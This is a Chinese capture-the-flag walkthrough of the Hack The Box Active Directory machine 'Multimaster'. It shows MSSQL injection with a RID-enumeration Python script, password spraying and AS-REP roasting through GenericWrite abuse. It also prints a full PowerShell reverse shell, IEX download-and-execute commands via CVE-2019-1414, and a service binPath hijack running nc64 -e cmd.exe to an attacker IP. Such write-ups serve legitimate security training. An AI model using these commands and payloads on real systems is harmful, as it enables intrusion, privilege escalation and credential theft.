## AD-Multimaster

### 0x00 前言

本小白最近在学域渗透，决定把Hack The Box的Active Directory 101
系列域渗透靶机打完，并详细记录当中用到的工具、知识点及其背后的原理。本篇文章是该系列的第九篇，靶机名字为Multimaster，这是一台疯狂难度的靶机。

### 0x01 信息搜集

 **端口及服务扫描**

    
    
    nmap -sC -sV -p- 10.10.10.179 -T4 -oA nmap_multimaster
    
    
    
    Nmap scan report for 10.10.10.179
    Host is up (0.20s latency).
    Not shown: 65513 filtered ports
    PORT      STATE SERVICE       VERSION
    53/tcp    open  domain?
    | fingerprint-strings: 
    |   DNSVersionBindReqTCP: 
    |     version
    |_    bind
    80/tcp    open  http          Microsoft IIS httpd 10.0
    | http-methods: 
    |_  Potentially risky methods: TRACE
    |_http-server-header: Microsoft-IIS/10.0
    |_http-title: MegaCorp
    88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-12-01 06:05:02Z)
    135/tcp   open  msrpc         Microsoft Windows RPC
    139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
    389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
    445/tcp   open  microsoft-ds  Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGACORP)
    464/tcp   open  kpasswd5?
    593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    636/tcp   open  tcpwrapped
    3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
    3269/tcp  open  tcpwrapped
    3389/tcp  open  ms-wbt-server Microsoft Terminal Services
    | rdp-ntlm-info: 
    |   Target_Name: MEGACORP
    |   NetBIOS_Domain_Name: MEGACORP
    |   NetBIOS_Computer_Name: MULTIMASTER
    |   DNS_Domain_Name: MEGACORP.LOCAL
    |   DNS_Computer_Name: MULTIMASTER.MEGACORP.LOCAL
    |   DNS_Tree_Name: MEGACORP.LOCAL
    |   Product_Version: 10.0.14393
    |_  System_Time: 2022-12-01T06:07:34+00:00
    | ssl-cert: Subject: commonName=MULTIMASTER.MEGACORP.LOCAL
    | Not valid before: 2022-11-30T05:24:52
    |_Not valid after:  2023-06-01T05:24:52
    |_ssl-date: 2022-12-01T06:08:13+00:00; +6m57s from scanner time.
    5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-server-header: Microsoft-HTTPAPI/2.0
    |_http-title: Not Found
    9389/tcp  open  mc-nmf        .NET Message Framing
    49666/tcp open  msrpc         Microsoft Windows RPC
    49667/tcp open  msrpc         Microsoft Windows RPC
    49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    49675/tcp open  msrpc         Microsoft Windows RPC
    49678/tcp open  msrpc         Microsoft Windows RPC
    49697/tcp open  msrpc         Microsoft Windows RPC
    49706/tcp open  msrpc         Microsoft Windows RPC
    1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
    SF-Port53-TCP:V=7.80%I=7%D=12/1%Time=63884272%P=x86_64-pc-linux-gnu%r(DNSV
    SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
    SF:x04bind\0\0\x10\0\x03");
    Service Info: Host: MULTIMASTER; OS: Windows; CPE: cpe:/o:microsoft:windows
    
    Host script results:
    |_clock-skew: mean: 1h42m57s, deviation: 3h34m40s, median: 6m56s
    | smb-os-discovery: 
    |   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
    |   Computer name: MULTIMASTER
    |   NetBIOS computer name: MULTIMASTER\x00
    |   Domain name: MEGACORP.LOCAL
    |   Forest name: MEGACORP.LOCAL
    |   FQDN: MULTIMASTER.MEGACORP.LOCAL
    |_  System time: 2022-11-30T22:07:34-08:00
    | smb-security-mode: 
    |   account_used: <blank>
    |   authentication_level: user
    |   challenge_response: supported
    |_  message_signing: required
    | smb2-security-mode: 
    |   2.02: 
    |_    Message signing enabled and required
    | smb2-time: 
    |   date: 2022-12-01T06:07:38
    |_  start_date: 2022-12-01T05:24:59
    

**SMB信息搜集**

    
    
    crackmapexec smb 10.10.10.179 -u "" -p "" --shares
    

![图片.png](https://image.3001.net/images/20221212/1670778916_63961024e904481f29196.png!small)

暂时在SMB上没有什么发现

 **RPC信息搜集**

    
    
    rpcclient -U "" 10.10.10.161
    

![图片.png](https://image.3001.net/images/20221212/1670778926_6396102eaa0be7d4ca16d.png!small)

成功获得了一些用户名

 **Kerberos信息搜集**

把获得用户名放入users.txt以备后续使用

    
    
    ./kerbrute_linux_amd64 userenum --dc 10.10.10.179 -d MEGACORP.LOCAL /root/HTB/multimaster/user.txt
    

![图片.png](https://image.3001.net/images/20221212/1670778933_63961035b0f39d93436ba.png!small)

然后我又尝试了通过一个较大的字典来枚举用户名

    
    
    kerbrute_linux_amd64 userenum --domain megacorp.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.10.179
    

![图片.png](https://image.3001.net/images/20221212/1670778941_6396103dd366461623ec7.png!small)  
把获得的回显放入到test.txt文件中，并使用简单的shell命令过滤获得用户名（学会使用简单的shell命令，有助于优雅的渗透0.^）

    
    
    cat test.txt | awk '{print $7}'|sed s/@megacorp.local$//g
    

![图片.png](https://image.3001.net/images/20221212/1670778953_639610494b317d5465020.png!small)

把获得的这些用户名和前面获得的用户名放入user.txt文件中以备后续使用。

### 0x02 MSSQL 注入

通过访问80端口开放的http服务发现，只存在两处用户可以输入的地方一个是下图Colleague
Finder功能的输入框，另一处是登录框，我使用了暴力破解的方法测试了登录功能，但是并没有成功，然后我觉得测试下图输入位置，看是否存在SQL注入之类的问题

![图片.png](https://image.3001.net/images/20221212/1670778961_63961051d5a4db22cc4a7.png!small)

由于通过常规的输入一直回显lnvalid name，所以我尝试通过wfuzz跑一下特殊字符的字典，看能否有所反应

    
    
    wfuzz -c -u http://10.10.10.179/api/getColleagues -w /usr/share/seclists/Fuzzing/special-chars.txt -d '{"name":"FUZZ"}' -H 'Content-Type: application/json;charset=utf-8' -t 1
    
    wfuzz -c -u http://10.10.10.179/api/getColleagues -w /usr/share/seclists/Fuzzing/special-chars.txt -d '{"name":"FUZZ"}' -H 'Content-Type: application/json;charset=utf-8' -t 1 --hc 200
    

![图片.png](https://image.3001.net/images/20221212/1670778968_63961058aa8fba73fefc9.png!small)

我发现`"`和`\`符号破坏了东西，导致了响应码为500,根据经验我们都知道`\`是转义符号这很好理解，那`"`导致服务器抛出异常这就存在问题了，然后我使用了burp抓包

![图片.png](https://image.3001.net/images/20221212/1670778985_63961069641fe26f49234.png!small)

从 Burp 的请求中我注意到它特别调用了`charset=utf-8`字符，`'`它的 ASCII 十六进制值为 0x27。所以我发送了
name`\u27`，它返回了错误：

![图片.png](https://image.3001.net/images/20221212/1670778992_63961070535d90204dfb9.png!small)

把这个请求包保存到1.txt文件中，然后使用sqlmap进行测试，这时我需要用到SQLmap的一些功能：

    
    
    sqlmap -r 1.txt --tamper=charunicodeescape --delay 5 --level 5 --risk 3 --batch --proxy http://127.0.0.1:8080
    --tamper=charunicodeescape 		  #篡改插件将对有效负载中的所有字符进行 unicode 编码。这将避免 WAF 检查坏字符。
    --delay 5   					 #将进程减慢到一个请求停5秒。它可能可以走得更快，但我们需要求稳，
    --proxy  						 #我添加了该选项这样我可以在Burp看到它发送的包，以及相应的回显情况。
    --level 5 --risk 3				  #把它愿意尝试的事情发挥到极致。
    --batch           				  #将对任何提示采用默认答案。
    --dump-all                          #显示所有的数据
    --exclude-sysdbs				   #只有包含非系统数据库的数据才会被获取并显示出来
    
    sqlmap -r 1.txt --tamper=charunicodeescape --delay 5 --level 5 --risk 3 --batch --proxy http://127.0.0.1:8080  --dump-all   --exclude-sysdbs
    
    
    
    Database: Hub_DB 
    Table: Logins
    [17 entries]
    +------+----------+--------------------------------------------------------------------------------------------------+
    | id   | username | password                                                                                         |
    +------+----------+--------------------------------------------------------------------------------------------------+
    | 1    | sbauer   | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 |
    ···
    ···
    ···
    | 17   | egre55   | cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc |
    +------+----------+--------------------------------------------------------------------------------------------------+
    
    通过以上结果发现多个用户的hash一致，总结一下：
    egre55、minatotw：
    cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc
    sbauer、shayna、james、cyork、jorden、aldom：
    9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739
    okent、rmartin、alyx、nbourne：
    fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa
    ckane、kpage、zac、ilee、zpowers：
    68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813
    
    
    
    #提取hash
    cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc
    9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739
    fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa
    68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813
    #爆破hash
    hashcat -m 17900 hashes /usr/share/wordlists/rockyou.txt --force
    #爆破结果
    9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739:password1
    68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813:finance1
    fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa:banking1
    

我们发现了四个hash，但是只成功爆破出了其中的三个，我们把获得密码放入passwords.txt

我想看看我是否可以在 SMB 上使用这些密码中的任何一个，但都失败了：

    
    
    crackmapexec smb 10.10.10.179 -u users.txt -p passwords.txt
    

### 0x03 MSSQL 注入枚举域用户名

通过查看大佬的文章，我发现可以使用 RID 蛮力通过 MSSQL 注入来执行[Active Directory
枚举以查找其他用户名。](https://keramas.github.io/2020/03/22/mssql-ad-enumeration.html)

整个攻击的原理很简单：

  * 找出域名 #这个我们已经知道了

  * 找出域的SID

  * 通过迭代一系列 RID 来确定每个对象的名称，从而构建用户、组和计算机 SID。

 **什么是 SID 和 RID？**

一个`security ID`或 SID，是 Windows 用来识别和引用用户、组和计算机帐户的唯一字符串。

例子：

    
    
    S-1-5-21-4142252318-1896537706-4233180933-1020
    

这`4142252318-1896537706-4233180933`部分唯一标识域或本地计算机，最后的剩余值 (`1020`) 是一个
RID，它是一个`relative ID`. RID 分配给在域或本地计算机中创建的任何用户、组或计算机帐户，从 1000 开始。

这意味着如果我们有域 SID，我们可以遍历一系列 RID 以生成完整的用户 SID，并返回该 SID 标识的明文名称。 对于域帐户，安全主体的 SID
是通过将域的 SID 与帐户的相对标识符 (RID) 连接起来创建的。所以，概念很简单，我们需要找到域的 SID，然后遍历一系列 RID
从而确定每个对象的名称。这样，我们就有可能发现数据库中不存在的潜在用户。

在这里，使用[SUSER_SID()](https://docs.microsoft.com/en-us/sql/t-sql/functions/suser-sid-transact-sql?view=sql-server-ver16)函数，我们可以获得指定登录名的安全标识号
(SID)，使用[SUSER_SNAME()](https://docs.microsoft.com/en-us/sql/t-sql/functions/suser-sname-transact-sql?view=sql-server-ver16)函数，我们可以获得与安全标识号 (SID) 关联的登录名。

 **Domain Admins** 组有许多[众所周知的](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers)RID，例如 **512** 。让我们构建一个请求，看看这种攻击是否有效。

    
    
    hello' UNION SELECT 1,sys.fn_varbintohexstr(SUSER_SID('MEGACORP\Domain Admins')),3,4,5--    

![图片.png](https://image.3001.net/images/20221212/1670779018_6396108a1915c15c6c9f6.png!small)

请注意，我们使用 **sys.fn_varbintohexstr** 函数将 SID 转换为十六进制，因为*SUSER_SID()*返回二进制值。

然后，使用[CyberChef](https://gchq.github.io/CyberChef/)和Escape Unicode
Characters模块，我们可以对我们的请求进行编码，最后使用 **Burp** 发送即可。

![图片.png](https://image.3001.net/images/20221212/1670779027_639610934d22e824539e6.png!small)

得到的SID值（十六进制）为 **56** 字节。前 **48 个** 字节是域 SID，其余 **8 个** 字节是 RID。现在我们有：

    
    
    - The full   SID   0x0105000000000005150000001c00d1bcd181f1492bdfc23600020000   (58 bytes)
    - The domain SID   0x0105000000000005150000001c00d1bcd181f1492bdfc236           (48 bytes)
    - The Domain Admins RID 0x00020000                                              (8  bytes)
    

RID 需要反转即 **0x00000200** 转换成10进制即512

我们现在拥有域 SID，让我们再来看看是否可以构建管理员帐户 SID (RID为 **500** )：

    
    
    500转成hex   0x1F4
    补全8位      0x000001F4
    反转         0xf4010000
    然后我们把前面域SID加上   0x0105000000000005150000001c00d1bcd181f1492bdfc236f4010000
    
    
    
    hello' UNION SELECT 1,SUSER_SNAME(0x0105000000000005150000001c00d1bcd181f1492bdfc236f4010000),3,4,5--    

然后，使用[CyberChef](https://gchq.github.io/CyberChef/)和Escape Unicode
Characters模块，我们可以对我们的请求进行编码，最后使用 **Burp** 发送即可。（步骤同上，这里不再截图）

![图片.png](https://image.3001.net/images/20221212/1670779045_639610a517ff672146779.png!small)

我们可以看到我们已经通过构造的SID拿到了用户的名字，看到这里大家应该明白了这个攻击方法的原理，接下来我们通过使用python脚本来枚举域用户名

    
    
    import json
    import requests
    from time import sleep
    
    url = 'http://10.129.247.110/api/getColleagues'
    
    # Encode our payload
    def encode_me(str):
        val = []
        for i in str:
            val.append("\\u00"+hex(ord(i)).split("x")[1])
    
        return ''.join([i for i in val])
    
    # Iterate RID
    sid = ''
    for i in range(500,10000):
        i = hex(i)[2:].upper()
        if len(i) < 4:
            i = '0' + i
    
        # Reverse our RID
        t = bytearray.fromhex(i)
        t.reverse()
        t = ''.join(format(x,'02x') for x in t).upper()+'0'*4
    
        # Build the request
        sid = '0x0105000000000005150000001c00d1bcd181f1492bdfc236{}'.format(t)
        payload = "hello' UNION SELECT 1,SUSER_SNAME({}),3,4,5--".format(sid)
        r = requests.post(url,data='{"name":"'+ encode_me(payload) + '"}',headers={'Content-Type': 'Application/json'})
    
        user = json.loads(r.text)[0]["name"]
    
        if user:
            print(user)
    
        # Sleep to avoid triggering the WAF
        sleep(3)
    

我们通过python脚本进行了枚举了RID 500到RID 10000的情况，然后拿到了一些的用户名

    
    
    root@kali2020:~/HTB/multimaster# python sqli.py 
    ···
    MEGACORP\DnsAdmins
    MEGACORP\DnsUpdateProxy
    MEGACORP\svc-nas
    MEGACORP\Privileged IT Accounts
    MEGACORP\tushikikatomo
    MEGACORP\andrew
    MEGACORP\lana
    ···
    

把得到的输出放到users1.txt中，然后使用以下正则把MEGACORP\过滤掉

    
    
    cat users1.txt | sed -e 's/MEGACORP\\//g' | sort | uniq
    #sed -e 's/MEGACORP\\//g'       将字符串中MEGACORP\部分替换为空
    #sort                           排序
    #uniq                           去重
    

把获得用户名加入到users2.txt 再次尝试密码喷洒

    
    
    root@kali2020:~/HTB/multimaster# crackmapexec smb 10.10.10.179 -u users2.txt -p passwords.txt
    SMB         10.10.10.179    445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 (name:MULTIMASTER) (domain:MEGACORP.LOCAL) (signing:True) (SMBv1:True)
    ···
    SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\Privileged:finance1 STATUS_LOGON_FAILURE 
    SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\Privileged:banking1 STATUS_LOGON_FAILURE 
    SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\tushikikatomo:password1 STATUS_LOGON_FAILURE 
    SMB         10.10.10.179    445    MULTIMASTER      [+] MEGACORP.LOCAL\tushikikatomo:finance1 
    ···
    

检查该用户是否可以远程登录

    
    
    crackmapexec winrm 10.10.10.179 -u tushikikatomo -p finance1
    

![图片.png](https://image.3001.net/images/20221212/1670779073_639610c14b9a2d97a73a5.png!small)

发现可以远程登录，于是我们可以使用evil-winrm来拿到tushikikatomo用户的shell，然后我们在该路径的桌面拿到了普通用户的flag

    
    
    evil-winrm -i 10.10.10.179 -u tushikikatomo -p finance1
    

![图片.png](https://image.3001.net/images/20221212/1670779081_639610c92069cb6b9f5c6.png!small)

### 0x04 CVE-2019-1414

    
    
    #适用于 Windows 的特权升级枚举脚本:https://github.com/itm4n/PrivescCheck
    git clone https://github.com/itm4n/PrivescCheck.git          #将项目下载到kali
    cd PrivescCheck
    python -m http.server 80                                      #使用python开启一个临时的http服务
    
    
    
    IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.2/PrivescCheck.ps1'); Invoke-PrivescCheck -Extended
    

![图片.png](https://image.3001.net/images/20221212/1670779089_639610d1e1ccd444c2754.png!small)

发现该机器上装了Microsoft VS Code 查看版本

![图片.png](https://image.3001.net/images/20221212/1670779096_639610d81ee11acb8f794.png!small)

经过搜索发现该版本存在[CVE-2019-1414](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-1414)漏洞。

当 Visual Studio Code
向本地计算机的用户公开调试侦听器时，它会存在特权提升漏洞。成功利用此漏洞的本地攻击者可以注入任意代码以在当前用户的上下文中运行。如果当前用户使用管理用户权限登录，则攻击者可以控制受影响的系统。

该漏洞的详细利用方法：https://iwantmore.pizza/posts/cve-2019-1414.html

工具[cefdebug](https://github.com/taviso/cefdebug)，可以帮助我们利用这个漏洞，首先，先下载[cefdebug](https://github.com/taviso/cefdebug/releases/download/v0.2/cefdebug.zip)并将其上传到目标机器。

    
    
    iwr -uri  http://10.10.16.4/cefdebug.exe -outfile cefdebug.exe
    

然后，我们可以扫描本地机器以找到 CEF 调试器。我们发现了一个似乎是 CEF 调试器的服务器,那么我们可以作为运行 **VS Code** 的用户获得一个
shell 。

![图片.png](https://image.3001.net/images/20221212/1670779107_639610e3ca75c24e4a86c.png!small)

我们使用以下 PowerShell 版的反向 shell：

    
    
    $client = New-Object System.Net.Sockets.TCPClient('10.10.16.4',5555);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PSReverseShell# ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}$client.Close();
    

首先在kali上开启监听

    
    
    nc -lnvp 5555
    

最后，我们可以使用`cefdebug.exe`运行 CEF 调试器的服务器下载和执行反向 shell。

    
    
    .\cefdebug.exe --url ws://127.0.0.1:61463/3afeb851-0811-4c4e-9add-5b95b899f99d --code "process.mainModule.require('child_process').exec('powershell IEX(New-Object Net.WebClient).DownloadString(\'http://10.10.16.4/reshell.ps1\')')"
    

![图片.png](https://image.3001.net/images/20221212/1670779121_639610f1db61d432a6a0f.png!small)

我们发现cyork能够读取c:\inetpub的内容，并且发现了一个名为MultimasterAPI.dll的DLL
，然后我通过查看该dll的源代码，发现了一个带有硬编码密码的数据库连接字符串。

![图片.png](https://image.3001.net/images/20221212/1670779129_639610f99166a0adcdaf4.png!small)

我们在前面拿到了好多个数据库的用户名，这里我们来尝试使用密码喷洒

    
    
    crackmapexec smb 10.10.10.179 -u dbusers.txt -p 'D3veL0pM3nT!'          #密码喷洒
    crackmapexec winrm 10.10.10.179 -u sbauer -p 'D3veL0pM3nT!'             #检查是否可以远程登录
    

![图片.png](https://image.3001.net/images/20221212/1670779138_63961102b612e476da315.png!small)

### 0x05 GenericWrite权限的滥用

    
    
    evil-winrm -i 10.10.10.179 -u sbauer -p 'D3veL0pM3nT!'              #远程登录
    

![图片.png](https://image.3001.net/images/20221212/1670779145_639611094de86e75c48b9.png!small)

经过一番搜集没发现什么有意思的东西，这里尝试使用Blooodhound进行信息搜集，其实在这之前获得任意一个用户的shell后我也都有尝试bloodhound，但是都是一直报错，直到这个用户，发现可以正常运行

    
    
    python bloodhound.py -c all -u sbauer -p 'D3veL0pM3nT!' -d MEGACORP.LOCAL -ns 10.10.10.179
    

![图片.png](https://image.3001.net/images/20221212/1670779155_6396111321560f5921843.png!small)

将获得的json文件导入bloodhound分析，发现当前用户对JORDEN用户具有通用写权限，而JORDEN用户属于SERVER_OPERATORS组（高权限组）

    
    
    GenericWrite：通用写访问权授予你写入目标对象上任何不受保护的属性的能力，包括组的“成员”和用户的“服务主体名称”。
    

![图片.png](https://image.3001.net/images/20221212/1670779162_6396111a78c4eb26516b6.png!small)

这里我们回顾一下我在前面的文章中提到的 AS-REP roasting攻击，该攻击允许为选择了“不需要 Kerberos
预身份验证”属性的用户检索密码哈希的技术。事实上，如果用户没有启用 Kerberos 预身份验证，我们可以为该用户请求 AS-REP，并且可以离线破解从而尝试恢复其明文密码。而这里SBAUER用户对JORDEN用户具有通用写权限，那么我们可以为JORDEN用户设置“不需要
Kerberos 预身份验证”的属性，从而尝试使用AS-REP roasting攻击获取其明文密码。

我们可以使用下面这条命令来为JORDEN用户设置“不需要 Kerberos 预身份验证”的属性

    
    
    Get-ADUser jorden | Set-ADAccountControl -doesnotrequirepreauth $true
    

然后我们可以使用impactet下的GetNPUsers脚本来获取jorden用户的AS-rep票据

    
    
    GetNPUsers.py megacorp.local/jorden -dc-ip 10.10.10.179
    

![图片.png](https://image.3001.net/images/20221212/1670779170_63961122c189e0814b4ce.png!small)

我们把获取到的票据放到asrep.txt文件中，然后使用hashcat尝试破解获取其明文密码

    
    
    root@kali2020# hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt --force
    ...
    $krb5asrep$23$jorden@MEGACORP.LOCAL:c6e1735f291d71135278005a61a8e78e$771ee4486ddcf18fdf2ee216bf2e66cff076ef6907a1154f3458c7e5ef2f65038263f9ce459cfa964ad0057b53676f4c326e5d380910e
    48d9fee2c585819d70cea63442b035359ef6f9cb3a8cfdfffe981c8e7c0aaaf913f9bf8d8df96147b30f15b71e5a9541dcdfcfef20670edfb46b2973917d661fadcc48df2aa9f72c1586a1bbcbff4420f89c4360125f1a9a23
    12466f69201ed5035db7952bb6eaa3cec0edf0888e958e0180333ba11fde7e0448836d87fe3090152980a95c1e6c1a151a83603f1380ea7c306cfbd74fdd19a507c36c1d38db5c7231e9fee7bdbe73ad1dedac61c2b1e9d3ef
    2e36834206c2130:rainforest786
    ...
    

### 0x06 Server Operators组权限的滥用

    
    
    crackmapexec winrm 10.10.10.179   -u jorden -p 'rainforest786'             #检查是否可以远程登录
    evil-winrm      -i 10.10.10.179   -u jorden -p 'rainforest786'             #远程登录
    

![图片.png](https://image.3001.net/images/20221212/1670779185_639611314724d92b7ca05.png!small)

    
    
    Server Operators组：该组仅存在于域控制器上的内置组。默认情况下，该组没有成员。服务器操作员可以交互式登录到服务器；创建和删除网络共享；启动和停止服务；备份和恢复文件；格式化电脑硬盘；并关闭计算机。
    

![图片.png](https://image.3001.net/images/20221212/1670779190_639611366d9d30705ee1c.png!small)

我们发现该用户属于Server Operators组，默认情况下，该组具备启动和停止服务的能力，并且该用户可以编辑任何服务。

所以我这里想使用服务路径劫持的方式来获得系统权限，首先上传`nc64.exe`到C:\programdata

    
    
    *Evil-WinRM* PS C:\programdata> upload /root/nc64.exe
    Info: Uploading /root/nc64.exe to C:\programdata\nc64.exe
                                                                
    Data: 60360 bytes of 60360 bytes copied
    
    Info: Upload successful!
    

经过一些尝试，我发现可以改变`browser`服务的路径

    
    
    *Evil-WinRM* PS C:\programdata> sc.exe config browser binPath= "C:\programdata\nc64.exe -e cmd.exe 10.10.16.4 443"
    [SC] ChangeServiceConfig SUCCESS
    
    
    
    *Evil-WinRM* PS C:\programdata> sc.exe stop browser
    
    SERVICE_NAME: browser
            TYPE               : 20  WIN32_SHARE_PROCESS
            STATE              : 3  STOP_PENDING
                                    (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
            WIN32_EXIT_CODE    : 0  (0x0)
            SERVICE_EXIT_CODE  : 0  (0x0)
            CHECKPOINT         : 0x1
            WAIT_HINT          : 0xafc8
    *Evil-WinRM* PS C:\programdata> sc.exe start browser
    [SC] StartService FAILED 1053:
    
    The service did not respond to the start or control request in a timely fashion.
    

它报告失败了，但那是因为`nc64.exe`不是服务二进制文件，但是我反弹的shell已经回来了

    
    
    root@kali2020#nc -lnvp 443
    Ncat: Version 7.80 ( https://nmap.org/ncat )
    Ncat: Listening on :::443
    Ncat: Listening on 0.0.0.0:443
    Ncat: Connection from 10.10.10.179
    Ncat: Connection from 10.10.10.179:50019.
    Microsoft Windows [Version 10.0.14393]
    (c) 2016 Microsoft Corporation. All rights reserved.
    
    C:\Windows\system32>whoami
    nt authority\system
    C:\Windows\system32>type C:\users\administrator\desktop\root.txt
    c793ac04******************
    

### 0x07 SeBackupPrivilege和SeRestorePrivilege权限的滥用

通过使用`whoami /priv`命令发现该用户具有SeBackupPrivilege`和`SeRestorePrivilege权限

![图片.png](https://image.3001.net/images/20221212/1670779198_6396113e93adc4d45da6b.png!small)

有了SeBackupPrivilege和SeRestorePrivilege这两个权限，我就可以用`robocopy`来读取文件，这里我们当然是尝试读取root.txt了，在实战环境下我们可以尝试读取其他的一些敏感文件。

![图片.png](https://image.3001.net/images/20221212/1670779221_63961155d57b4ae4de29a.png!small)

### 0x08 总结

由于该靶机攻击过程比较复杂，使用语言描述不如使用流程图，这里我使用流程图来对该靶机进行总结：

![图片.png](https://image.3001.net/images/20221212/1670779234_63961162f15e38e350b19.png!small)

